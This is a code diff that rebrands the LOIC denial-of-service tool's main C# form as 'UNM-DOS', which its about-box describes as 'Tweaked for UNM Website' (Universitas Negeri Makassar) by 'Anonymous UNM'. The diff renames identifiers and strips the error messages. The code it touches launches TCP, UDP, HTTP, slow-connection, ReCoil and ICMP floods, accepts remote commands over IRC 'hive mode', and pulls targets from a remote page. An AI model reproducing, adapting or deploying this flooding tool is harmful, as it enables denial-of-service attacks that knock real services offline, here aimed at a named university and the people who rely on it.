@@ -9,7 +9,7 @@ using System.Threading;
 using System.Windows.Forms;
 using Meebey.SmartIrc4net;
 
-namespace LOIC
+namespace unmdosx
 {
 	public partial class frmMain : Form
 	{
@@ -31,7 +31,7 @@ namespace LOIC
 		private delegate void CheckParamsDelegate(List<string> pars);
 
 		/// <summary>
-		/// Initializes a new instance of the <see cref="LOIC.frmMain"/> class.
+		/// Initializes a new instance of the <see cref="unmdosx.frmMain"/> class.
 		/// </summary>
 		/// <param name="hive">Whether to enter hive mode.</param>
 		/// <param name="hide">Whether to hide the form.</param>
@@ -95,12 +95,12 @@ namespace LOIC
 					if(tShowStats.Enabled) tShowStats.Stop();
 
 					if (!Functions.ParseInt(txtPort.Text, 0, 65535, out iPort)) {
-					//	Wtf ("I don't think ports are supposed to be written like THAT.", silent);
+					//	
 						return;
 					}
 
 					if (!Functions.ParseInt(txtThreads.Text, 1, 99, out iThreads)) {
-					//	Wtf ("What on earth made you put THAT in the threads field?", silent);
+					//	
 						return;
 					}
 
@@ -115,24 +115,24 @@ namespace LOIC
 						// Analysis disable once EmptyGeneralCatchClause
 					} catch { }
 					if(protocol == Protocol.None) {
-					//	Wtf ("Select a proper attack method.", silent);
+					//	
 						return;
 					}
 
 					sData = txtData.Text.Replace(@"\r", "\r").Replace(@"\n", "\n");
 					if(String.IsNullOrEmpty(sData) && (protocol == Protocol.TCP || protocol == Protocol.UDP)) {
-					//	Wtf ("Gonna spam with no contents? You're a wise fellow, aren't ya? o.O", silent);
+					//
 						return;
 					}
 
 					sSubsite = txtSubsite.Text;
 					if (!sSubsite.StartsWith("/") && (int)protocol >= (int)Protocol.HTTP && (int)protocol != (int)Protocol.ICMP) {
-					//	Wtf ("You have to enter a subsite (for example \"/\")", silent);
+					//	
 						return;
 					}
 
 					if (!int.TryParse(txtTimeout.Text, out iTimeout) || iTimeout < 1) {
-					//	Wtf ("What's up with something like that in the timeout box? =S", silent);
+					//
 						return;
 					}
 					if (iTimeout > 999)
@@ -143,7 +143,7 @@ namespace LOIC
 
 					bResp = chkWaitReply.Checked;
 
-					if (protocol == Protocol.slowLOIC || protocol == Protocol.ReCoil || protocol == Protocol.ICMP)
+					if (protocol == Protocol.slowunmdosx || protocol == Protocol.ReCoil || protocol == Protocol.ICMP)
 					{
 						if (!int.TryParse(txtSLSpT.Text, out iSockspThread) || iSockspThread < 1)
 							throw new Exception("A number is fine too!");
@@ -151,7 +151,7 @@ namespace LOIC
 				}
 				catch (Exception ex)
 				{
-				//	Wtf (ex.Message, silent);
+				//	
 					return;
 				}
 
@@ -183,9 +183,9 @@ namespace LOIC
 					{
 						ts = new ReCoil(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkAllowGzip.Checked);
 					}
-					if (protocol == Protocol.slowLOIC)
+					if (protocol == Protocol.slowunmdosx)
 					{
-						ts = new SlowLoic(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkAllowGzip.Checked);
+						ts = new Slowunmdosx(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkAllowGzip.Checked);
 					}
 					if (protocol == Protocol.HTTP)
 					{
@@ -241,15 +241,7 @@ namespace LOIC
 		/// </summary>
 		/// <param name="message">Message.</param>
 		/// <param name="silent">If set to <c>true</c> silent.</param>
-		private void Wtf(string message, bool silent = false)
-		{
-			if (silent) {
-				return;
-			}
-
-			new frmWtf().Show();
-		//	MessageBox.Show(message, "What the shit.");
-		}
+		
 
 		/// <summary>
 		/// Lock on IP target.
@@ -262,7 +254,7 @@ namespace LOIC
 				string tIP = txtTargetIP.Text.Trim().ToLowerInvariant();
 				if(tIP.Length == 0)
 				{
-			//		Wtf ("I think you forgot the IP.", silent);
+			//		
 					return;
 				}
 				try
@@ -275,13 +267,13 @@ namespace LOIC
 				}
 				catch(FormatException)
 				{
-			//		Wtf ("I don't think an IP is supposed to be written like THAT.", silent);
+			//		
 					return;
 				}
 			}
 			catch(Exception ex)
 			{
-				Wtf (ex.Message, silent);
+				
 				return;
 			}
 		}
@@ -297,7 +289,7 @@ namespace LOIC
 				string tURL = txtTargetURL.Text.Trim().ToLowerInvariant();
 				if(tURL.Length == 0)
 				{
-					Wtf ("A URL is fine too...", silent);
+					
 					return;
 				}
 				if(!tURL.Contains("://"))
@@ -312,7 +304,7 @@ namespace LOIC
 				}
 				catch(UriFormatException)
 				{
-			//		Wtf ("I don't think a URL is supposed to be written like THAT.", silent);
+			//		
 					return;
 				}
 				catch(SocketException)
@@ -324,7 +316,7 @@ namespace LOIC
 			}
 			catch(Exception ex)
 			{
-		//		Wtf (ex.Message, silent);
+		//		
 				return;
 			}
 		}
@@ -349,7 +341,7 @@ namespace LOIC
 				}
 				if (disableHive.Checked && enabled)
 				{
-			//		Wtf ("Did you fill IRC options correctly?");
+			//		
 					return;
 				}
 
@@ -388,7 +380,7 @@ namespace LOIC
 						irc.Connect(txtIRCserver.Text, port);
 						channel = txtIRCchannel.Text.ToLowerInvariant();
 
-						irc.Login("LOIC_" + Functions.RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
+						irc.Login("unmdosx_" + Functions.RandomString(), "Newfag's remote unmdosx", 0, "IRCunmdosx");
 
 						// Spawn a thread to handle the listen.
 						irclisten = new Thread(IrcListenThread);
@@ -1000,9 +992,9 @@ namespace LOIC
 							{
 								ts = new ReCoil(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkAllowGzip.Checked);
 							}
-							if (protocol == Protocol.slowLOIC)
+							if (protocol == Protocol.slowunmdosx)
 							{
-								ts = new SlowLoic(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkAllowGzip.Checked);
+								ts = new Slowunmdosx(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkAllowGzip.Checked);
 							}
 							if (protocol == Protocol.HTTP)
 							{
@@ -1044,9 +1036,9 @@ namespace LOIC
 						{
 							ts = new ReCoil(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkAllowGzip.Checked);
 						}
-						if (protocol == Protocol.slowLOIC)
+						if (protocol == Protocol.slowunmdosx)
 						{
-							ts = new SlowLoic(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkAllowGzip.Checked);
+							ts = new Slowunmdosx(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkAllowGzip.Checked);
 						}
 						if (protocol == Protocol.HTTP)
 						{
@@ -1488,7 +1480,7 @@ namespace LOIC
 						{
 							string sResp = client.DownloadString(textOLServer.Text);
 							
-							string rxpa = "(\\[LOIC\\]\\s*(<[^>]*>)*\\s*(@?(\\S+)\\s*[:]\\s*([^<@\\n\\r\\t]+)\\s*@?\\s*(<[^>]*>[^<@\\n\\r\\t]*)*\\s*)+\\s*(<[^>]*>)*\\s*\\[/LOIC\\]|class=\"LO (tar|bu)\\s*(r)?\" href=\"([^\"]*)\"|LOIC: http://(\\S+))+";
+							string rxpa = "(\\[unmdosx\\]\\s*(<[^>]*>)*\\s*(@?(\\S+)\\s*[:]\\s*([^<@\\n\\r\\t]+)\\s*@?\\s*(<[^>]*>[^<@\\n\\r\\t]*)*\\s*)+\\s*(<[^>]*>)*\\s*\\[/unmdosx\\]|class=\"LO (tar|bu)\\s*(r)?\" href=\"([^\"]*)\"|unmdosx: http://(\\S+))+";
 							MatchCollection matches = Regex.Matches(sResp, rxpa, RegexOptions.Compiled | RegexOptions.IgnoreCase | RegexOptions.ECMAScript);
 							//string s = var_dump(matches, 0);
 							int i = (chkbOLUp.Checked) ? 0 : (matches.Count - 1);
@@ -1651,7 +1643,7 @@ namespace LOIC
 					break;
 				case Keys.F1:
 					try { Process.Start("help.chm"); }
-					catch  { //Wtf("Error 404 - Help Not Found", bIsHidden); 
+					catch  { 
                     }
 					break;
 			}
@@ -1661,13 +1653,13 @@ namespace LOIC
 		{
 			chkMsgRandom.Enabled = (bool)(cbMethod.SelectedIndex <= 1 || cbMethod.SelectedIndex == 5); // TCP_UDP or ICMP
 			txtData.Enabled      = (bool)(cbMethod.SelectedIndex <= 1); // TCP_UDP
-			chkRandom.Enabled    = (bool)(cbMethod.SelectedIndex >= 2 && cbMethod.SelectedIndex != 5); // HTTP_ReCoil_slowLoic
-			txtSubsite.Enabled   = (bool)(cbMethod.SelectedIndex >= 2 && cbMethod.SelectedIndex != 5); // HTTP_ReCoil_slowLoic
+			chkRandom.Enabled    = (bool)(cbMethod.SelectedIndex >= 2 && cbMethod.SelectedIndex != 5); // HTTP_ReCoil_slowunmdosx
+			txtSubsite.Enabled   = (bool)(cbMethod.SelectedIndex >= 2 && cbMethod.SelectedIndex != 5); // HTTP_ReCoil_slowunmdosx
 
-			txtSLSpT.Enabled     = (bool)(cbMethod.SelectedIndex >= 3); // ReCoil_slowLoic_ICMP
-			chkAllowGzip.Enabled = (bool)(cbMethod.SelectedIndex >= 2 && cbMethod.SelectedIndex != 5); // HTTP_ReCoil_slowLoic
+			txtSLSpT.Enabled     = (bool)(cbMethod.SelectedIndex >= 3); // ReCoil_slowunmdosx_ICMP
+			chkAllowGzip.Enabled = (bool)(cbMethod.SelectedIndex >= 2 && cbMethod.SelectedIndex != 5); // HTTP_ReCoil_slowunmdosx
 			chkWaitReply.Enabled = (bool)(cbMethod.SelectedIndex != 4 && cbMethod.SelectedIndex != 5); // TCP_UDP_HTTP_ReCoil
-			chkUseGet.Enabled    = (bool)(cbMethod.SelectedIndex == 2 || cbMethod.SelectedIndex == 4); // HTTP_slowLoic
+			chkUseGet.Enabled    = (bool)(cbMethod.SelectedIndex == 2 || cbMethod.SelectedIndex == 4); // HTTP_slowunmdosx
 		}
 
 		private void txtThreads_Leave(object sender, EventArgs e)
@@ -1739,7 +1731,7 @@ namespace LOIC
 
         private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
         {
-            MessageBox.Show("UNM-DOS (Universitas Negeri Makassar Denial of Service Tool)" + (Char)13 + "v1.0 by Anonymous UNM" + (Char)13 + (Char)13 + "Tweaked for UNM Website based on LOIC 2.9 by J. Oliveira", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            MessageBox.Show("UNM-DOS (Universitas Negeri Makassar Denial of Service Tool)" + (Char)13 + "v1.0 by Anonymous UNM" + (Char)13 + (Char)13 + "Tweaked for UNM Website based on unmdosx 2.9 by J. Oliveira", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
         }
 
         
